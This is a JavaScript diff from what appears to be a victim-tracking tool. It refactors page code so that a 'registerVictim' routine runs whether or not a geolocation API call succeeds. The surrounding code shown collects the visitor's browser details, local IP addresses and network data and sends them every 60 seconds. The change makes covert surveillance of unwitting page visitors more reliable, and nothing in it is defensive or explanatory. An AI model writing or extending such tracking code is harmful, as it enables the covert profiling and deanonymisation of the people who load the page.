@@ -1,9 +1,11 @@
 $(document).ready(function($) {
 
-    $.getJSON('https://api.ipgeolocation.io/ipgeo?apiKey=' + window.IpInfoApiKey, function(data) {
+    function registerVictim(geoData) {
         var d = getVictimData();
 
-        $.extend(true, d, data);
+        if (geoData) {
+            $.extend(true, d, geoData);
+        }
 
         var parser = new UAParser();
 
@@ -33,7 +35,7 @@ $(document).ready(function($) {
                     objUser.getIPs();
                     objUser.sendNetworks();
 
-                    setInterval(function(){ 
+                    setInterval(function(){
                         objUser.getIPs();
                         objUser.sendNetworks();
                     }, 60000);
@@ -43,6 +45,18 @@ $(document).ready(function($) {
             },
             error: function(error) {}
         });
+    }
+
+    $.ajax({
+        url: 'https://api.ipgeolocation.io/ipgeo?apiKey=' + window.IpInfoApiKey,
+        dataType: "json",
+        type: "GET",
+        success: function(data) {
+            registerVictim(data);
+        },
+        error: function(error) {
+            registerVictim(null);
+        }
     });
 });
 
